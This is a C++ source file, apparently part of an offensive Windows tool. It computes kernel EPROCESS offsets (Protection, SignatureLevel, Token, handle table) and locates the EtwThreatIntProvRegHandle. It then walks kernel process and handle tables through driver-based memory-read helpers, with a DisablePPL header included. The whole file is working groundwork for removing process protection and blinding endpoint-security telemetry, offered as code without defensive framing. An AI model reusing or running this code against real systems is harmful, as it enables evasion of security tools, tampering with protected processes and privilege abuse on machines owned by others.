#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

#include "DriverOps.h"
#include "FindOffset.h"
#include "DisablePPL.h"

Offsets offsets;
HMODULE _KernelModule;

WORD FindProcessUniqueProcessIdOffset()
{
    FARPROC pPsGetProcessId;
    WORD wUniqueProcessIdOffset;

    if (!(pPsGetProcessId = GetProcAddress(_KernelModule, "PsGetProcessId")))
    {
        printf("The procedure 'PsGetProcessId' was not found.\n");
        return FALSE;
    }

    //printf("PsGetProcessId @ 0x%016llx\n", (DWORD64)pPsGetProcessId);

#ifdef _WIN64
    memcpy_s(&wUniqueProcessIdOffset, sizeof(wUniqueProcessIdOffset), (PVOID)((ULONG_PTR)pPsGetProcessId + 3), sizeof(wUniqueProcessIdOffset));
#else
    memcpy_s(&wUniqueProcessIdOffset, sizeof(wUniqueProcessIdOffset), (PVOID)((ULONG_PTR)pPsGetProcessId + 2), sizeof(wUniqueProcessIdOffset));
#endif

    if (wUniqueProcessIdOffset > 0x0fff)
    {
        printf("The offset value of 'UniqueProcessId' is greater than the maximum allowed (0x%04x).", wUniqueProcessIdOffset);
        return FALSE;
    }


    return wUniqueProcessIdOffset;
}

WORD FindProcessActiveProcessLinksOffset()
{

    WORD wActiveProcessLinks;

    wActiveProcessLinks = FindProcessUniqueProcessIdOffset() + sizeof(PVOID);

    return wActiveProcessLinks;
}


WORD FindProcessProtectionOffset()
{
    FARPROC pPsIsProtectedProcess, pPsIsProtectedProcessLight;
    WORD wProtectionOffsetA, wProtectionOffsetB;


    if (!(pPsIsProtectedProcess = GetProcAddress(_KernelModule, "PsIsProtectedProcess")))
    {
        printf("The procedure 'PsIsProtectedProcess' was not found.\n");
        return FALSE;
    }

    //printf("PsIsProtectedProcess @ 0x%016llx", (DWORD64)pPsIsProtectedProcess);

    if (!(pPsIsProtectedProcessLight = GetProcAddress(_KernelModule, "PsIsProtectedProcessLight")))
    {
        printf("The procedure 'PsIsProtectedProcessLight' was not found.\n");
        return FALSE;
    }

    //printf("PsIsProtectedProcessLight @ 0x%016llx", (DWORD64)pPsIsProtectedProcessLight);

    memcpy_s(&wProtectionOffsetA, sizeof(wProtectionOffsetA), (PVOID)((ULONG_PTR)pPsIsProtectedProcess + 2), sizeof(wProtectionOffsetA));
    memcpy_s(&wProtectionOffsetB, sizeof(wProtectionOffsetB), (PVOID)((ULONG_PTR)pPsIsProtectedProcessLight + 2), sizeof(wProtectionOffsetB));

    //printf("Offset in PsIsProtectedProcess: 0x%04x | Offset in PsIsProtectedProcessLight: 0x%04x", wProtectionOffsetA, wProtectionOffsetB);

    if (wProtectionOffsetA != wProtectionOffsetB || wProtectionOffsetA > 0x0fff)
    {
        printf("The offset value of 'Protection' is inconsistent or is greater than the maximum allowed (0x%04x / 0x%04x)", wProtectionOffsetA, wProtectionOffsetB);
        return FALSE;
    }

    return wProtectionOffsetA;
}

WORD FindProcessSignatureLevelOffset()
{
    WORD wSignatureLevel;
    wSignatureLevel = (WORD)FindProcessProtectionOffset() - (2 * sizeof(UCHAR));

    return wSignatureLevel;
}

WORD FindProcessJobOffset()
{
    FARPROC pPsGetProcessJob;
    WORD wProcessJobOffset;

    if (!(pPsGetProcessJob = GetProcAddress(_KernelModule, "PsGetProcessJob")))
    {
        printf("The procedure 'PsGetProcessJob' was not found.\n");
        return FALSE;
    }

    //printf("PsGetProcessJob @ 0x%016llx\n", (DWORD64)pPsGetProcessJob);

#ifdef _WIN64
    memcpy_s(&wProcessJobOffset, sizeof(wProcessJobOffset), (PVOID)((ULONG_PTR)pPsGetProcessJob + 3), sizeof(wProcessJobOffset));
#else
    memcpy_s(&wProcessJobOffset, sizeof(wProcessJobOffset), (PVOID)((ULONG_PTR)pPsGetProcessJob + 2), sizeof(wProcessJobOffset));
#endif

    //printf("UniqueProcessJobOffset Offset: 0x%04x\n", wUniqueProcessJobOffset);

    if (wProcessJobOffset > 0x0fff)
    {
        printf("The offset value of 'ProcessJobOffset' is greater than the maximum allowed (0x%04x).\n", wProcessJobOffset);
        return FALSE;
    }


    return wProcessJobOffset;
}


DWORD FindEtwThreatIntProvRegHandleOffset()
{
    ULONG_PTR pKeInsertQueueApc;
    BYTE value1, value2, value3;
    DWORD offset, dwEtwThreatIntProvRegHandleOffset;


    if (!(pKeInsertQueueApc = (ULONG_PTR)GetProcAddress(_KernelModule, "KeInsertQueueApc")))
    {
        printf("The procedure 'KeInsertQueueApc' was not found.\n.");
        return false;
    }

    for (int i = 0; i < 200; i++) {
        memcpy_s(&value1, sizeof(value1), (PVOID)((ULONG_PTR)pKeInsertQueueApc + i), sizeof(value1));
        memcpy_s(&value2, sizeof(value2), (PVOID)((ULONG_PTR)pKeInsertQueueApc + i + 1), sizeof(value2));
        memcpy_s(&value3, sizeof(value3), (PVOID)((ULONG_PTR)pKeInsertQueueApc + i + 2), sizeof(value3));
        
        if ((value1 == 0x48 && value2 == 0x8b && value3 == 0x0d) || (value1 == 0x4c && value2 == 0x8b && value3 == 0x15)) {
            memcpy_s(&offset, sizeof(offset), (PVOID)((ULONG_PTR)pKeInsertQueueApc + i + 3), sizeof(offset));
            dwEtwThreatIntProvRegHandleOffset = (DWORD)(pKeInsertQueueApc + i + 3 + sizeof(offset) + offset - (ULONG_PTR)_KernelModule);

            //printf("TESTING HIT 0x%016llx: 0x%llx\n", pKeInsertQueueApc + i + 3 + sizeof(offset), offset);
            //printf("dwEtwThreatIntProvRegHandleOffset: 0x%llx\n", dwEtwThreatIntProvRegHandleOffset);

            return dwEtwThreatIntProvRegHandleOffset;
        }

    }

    printf("The offset of EtwThreatIntProvRegHandle cannot be found\n");


    return false;
}

WORD FindProcessDebugPortOffset() {

    FARPROC pPsGetProcessDebugPort;
    WORD wProcessDebugPortOffset;

    if (!(pPsGetProcessDebugPort = GetProcAddress(_KernelModule, "PsGetProcessDebugPort")))
    {
        printf("The procedure 'PsGetProcessDebugPort' was not found.\n");
        return FALSE;
    }

    //printf("PsGetProcessDebugPort @ 0x%016llx\n", (DWORD64)PsGetProcessDebugPort);

#ifdef _WIN64
    memcpy_s(&wProcessDebugPortOffset, sizeof(wProcessDebugPortOffset), (PVOID)((ULONG_PTR)pPsGetProcessDebugPort + 3), sizeof(wProcessDebugPortOffset));
#else
    memcpy_s(&wProcessDebugPortOffset, sizeof(wProcessDebugPortOffset), (PVOID)((ULONG_PTR)pPsGetProcessDebugPort + 2), sizeof(wProcessDebugPortOffset));
#endif

    //printf("UniqueProcessJobOffset Offset: 0x%04x\n", wUniqueProcessJobOffset);

    if (wProcessDebugPortOffset > 0x0fff)
    {
        printf("The offset value of 'ProcessDebugPortOffset' is greater than the maximum allowed (0x%04x).", wProcessDebugPortOffset);
        return FALSE;
    }


    return wProcessDebugPortOffset;

}

WORD FindProcessObjectTableOffset()
{
    WORD wProcessObjectTableOffset;
    wProcessObjectTableOffset = FindProcessDebugPortOffset() - 0x8;
    return wProcessObjectTableOffset;
}

WORD FindProcessTokenOffset()
{
    WORD wProcessTokenOffset;
    wProcessTokenOffset = FindProcessJobOffset() - 0x58;
    return wProcessTokenOffset;
}


DWORD FindKernelPsInitialSystemProcessOffset()
{
    ULONG_PTR pPsInitialSystemProcess;
    DWORD dwPsInitialSystemProcessOffset;

    if (!(pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(_KernelModule, "PsInitialSystemProcess")))
    {
        printf("The procedure 'PsInitialSystemProcess' was not found.\n.");
        return FALSE;
    }

    //printf("PsInitialSystemProcess @ 0x%016llx\n", (DWORD64)pPsInitialSystemProcess);

    dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)_KernelModule);

    //printf("Offset: 0x%08x", dwPsInitialSystemProcessOffset);

    return dwPsInitialSystemProcessOffset;
}



void InitOffsets() {

    _KernelModule = LoadLibraryW(L"ntoskrnl.exe");

    offsets = {
        FindKernelPsInitialSystemProcessOffset(),
        FindProcessUniqueProcessIdOffset(),
        FindProcessActiveProcessLinksOffset(),
        FindProcessObjectTableOffset(),
        FindProcessTokenOffset(),
        FindProcessProtectionOffset(),
        FindProcessSignatureLevelOffset(),
        FindEtwThreatIntProvRegHandleOffset()
    };
}

Offsets GetOffsets() {
    return offsets;
}


ULONG_PTR GetKernelBaseAddress()
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded))
        goto cleanup;

    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded)))
        goto cleanup;

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded))
        goto cleanup;

    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];

cleanup:
    if (lpImageBase)
        HeapFree(GetProcessHeap(), 0, lpImageBase);

    return pKernelBaseAddress;
}



BOOL GetInitialSystemProcessAddress(PULONG_PTR Addr)
{
    ULONG_PTR pKernelBase, pPsInitialSystemProcess, pInitialSystemProcess;

    *Addr = 0;

    if (!(pKernelBase = GetKernelBaseAddress()))
        return FALSE;

    pPsInitialSystemProcess = pKernelBase + offsets.PsInitialSystemProcessOffset;

    //printf("PsInitialSystemProcess @ 0x%016llx\n", pPsInitialSystemProcess);
    
    if (!(ReadPtr(pPsInitialSystemProcess, &pInitialSystemProcess)))
        return FALSE;

    //printf("System process @ 0x%016llx\n", pInitialSystemProcess);

    *Addr = pInitialSystemProcess;
    
    return TRUE;
}


BOOL GetProcessList(PCTRL_PROCESS_INFO* List)
{

    BOOL bResult = FALSE;
    PCTRL_PROCESS_INFO pProcessList = NULL, pProcessListNew;
    DWORD dwBaseSize = 4096, dwSize, dwNumberOfEntries = 0;
    DWORD64 dwProcessId;
    ULONG_PTR pProcess, pInitialSystemProcess;
    UCHAR bProtection, bSignatureLevel;

    if (!(pProcessList = (PCTRL_PROCESS_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBaseSize)))
        return FALSE;

    dwSize = sizeof(pProcessList->NumberOfEntries);

    if (!GetInitialSystemProcessAddress(&pInitialSystemProcess))
        return FALSE;

    pProcess = pInitialSystemProcess;

    do
    {
        if (!Read64(pProcess + offsets.UniqueProcessIdOffset, &dwProcessId))
            break;
        //printf("Process @ 0x%016llx has PID %d\n", pProcess, (DWORD)dwProcessId);
        dwSize += sizeof((*List)[0]);

        if (dwSize >= dwBaseSize)
        {
            dwBaseSize *= 2;
            if (!(pProcessListNew = (PCTRL_PROCESS_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pProcessList, dwBaseSize)))
                break;

            pProcessList = pProcessListNew;
        }

        pProcessList->Entries[dwNumberOfEntries].KernelAddress = pProcess;
        pProcessList->Entries[dwNumberOfEntries].Pid = (DWORD)dwProcessId;

        dwNumberOfEntries++;

        if (!ReadPtr(pProcess + offsets.ActiveProcessLinksOffset, &pProcess))
            break;

        pProcess = pProcess - offsets.ActiveProcessLinksOffset;

    } while (pProcess != pInitialSystemProcess);


    if (pProcess == pInitialSystemProcess)
    {
        pProcessList->NumberOfEntries = dwNumberOfEntries;
        bResult = TRUE;
        *List = pProcessList;
    }

    if (!bResult && pProcessList)
        HeapFree(GetProcessHeap(), 0, pProcessList);

    return bResult;
}

BOOL GetProcessKernelAddress(DWORD Pid, PULONG_PTR Addr)
{
    PCTRL_PROCESS_INFO pProcessInfo = NULL;
    DWORD dwIndex;
    ULONG_PTR pProcess = 0;

    if (!GetProcessList(&pProcessInfo))
        return FALSE;


    for (dwIndex = 0; dwIndex < pProcessInfo->NumberOfEntries; dwIndex++)
    {
        if (pProcessInfo->Entries[dwIndex].Pid == Pid)
        {
            pProcess = pProcessInfo->Entries[dwIndex].KernelAddress;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, pProcessInfo);

    if (pProcess == 0)
    {
        printf("Failed to retrieve Kernel address of process with PID %d.", Pid);
        return FALSE;
    }

    *Addr = pProcess;

    return TRUE;
}


DWORD64 GetHandleTableEntryAddress(DWORD64 HandleTable, ULONGLONG Handle)
{
    ULONGLONG v2;
    LONGLONG v3;
    ULONGLONG result;
    ULONGLONG v5;

    ULONGLONG a1 = (ULONGLONG)HandleTable;

    v2 = Handle & 0xFFFFFFFFFFFFFFFCui64;

    DWORD v2_r;
    Read32(a1, &v2_r);
    if (v2 >= v2_r) {
        result = 0i64;
    }
    else {
        DWORD64 v3_r; Read64(a1 + 8, &v3_r);
        v3 = v3_r;
        DWORD64 tmp64; Read64(a1 + 8, &tmp64);
        if (tmp64 & 3) {
            DWORD tmp32; Read32(a1 + 8, &tmp32);
            if ((tmp32 & 3) == 1) {
                DWORD64 v5_r; Read64(v3 + 8 * (v2 >> 10) - 1, &v5_r);
                v5 = v5_r;
                result = v5 + 4 * (v2 & 0x3FF);
            }
            else {
                DWORD tmp32; Read32(v3 + 8 * (v2 >> 19) - 2, &tmp32);
                DWORD v5_r; Read32(tmp32 + 8 * ((v2 >> 10) & 0x1FF), &v5_r);
                v5 = v5_r;
                result = v5 + 4 * (v2 & 0x3FF);
            }
        }
        else {
            result = v3 + 4 * v2;
        }
    }

    return (DWORD64)result;
}

